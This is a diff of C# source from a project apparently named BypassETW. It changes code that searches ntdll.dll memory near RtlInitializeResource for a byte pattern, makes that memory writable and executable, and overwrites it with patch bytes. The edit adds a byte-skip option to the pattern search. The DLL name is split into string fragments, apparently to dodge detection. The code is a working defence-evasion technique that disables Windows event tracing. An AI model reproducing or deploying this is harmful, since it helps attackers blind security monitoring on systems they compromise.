@@ -57,7 +57,7 @@ namespace BypassETW
             return is64Bit;
         }
 
-        private static IntPtr FindAddress(IntPtr address, byte[] egg)
+        private static IntPtr FindAddress(IntPtr address, byte[] egg, int miss_num = 0)
         {
             while (true)
             {
@@ -65,6 +65,16 @@ namespace BypassETW
 
                 while (true)
                 {
+                    if (miss_num != 0)
+                    {
+                        if (miss_num == count)
+                        {
+                            count++;
+                            address = IntPtr.Add(address, 1);
+                            continue;
+                        }
+                    }
+
                     // IntPtr ori_Addr = address;
                     address = IntPtr.Add(address, 1);
                     if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))
@@ -82,17 +92,25 @@ namespace BypassETW
         }
 
 
-        private static void MemoryPatch(string dllname, string funcname, byte[] egg, byte[] patch)
-        {
-             
+        private static void MemoryPatch(string dllname, string funcname, byte[] egg, byte[] patch, int miss_num = 0)
+        {     
             uint Oldprotect;
             uint Newprotect;
 
             IntPtr libAddr = LoadLibrary(dllname);
             IntPtr funcAddr = GetProcAddress(libAddr, funcname);
-            byte temp = Marshal.ReadByte(funcAddr, 1);
+            IntPtr PatchAddr = IntPtr.Zero;
+            // byte temp = Marshal.ReadByte(funcAddr, 1);
 
-            IntPtr PatchAddr = FindAddress(funcAddr, egg);
+            if (miss_num != 0)
+            {
+                PatchAddr = FindAddress(funcAddr, egg, miss_num);
+            }
+            else
+            {
+                PatchAddr = FindAddress(funcAddr, egg);
+            }
+
             VirtualProtect(PatchAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect);
             Marshal.Copy(patch, 0, PatchAddr, patch.Length);
             VirtualProtect(PatchAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
@@ -115,7 +133,7 @@ namespace BypassETW
             else
             {
                 // Console.WriteLine("x86");
-                MemoryPatch("ntd" + "ll.d" + "ll", "RtlInitializeResource", egg_x86, patch_code_x86);
+                MemoryPatch("ntd" + "ll.d" + "ll", "RtlInitializeResource", egg_x86, patch_code_x86, 17);
             }
         }
 
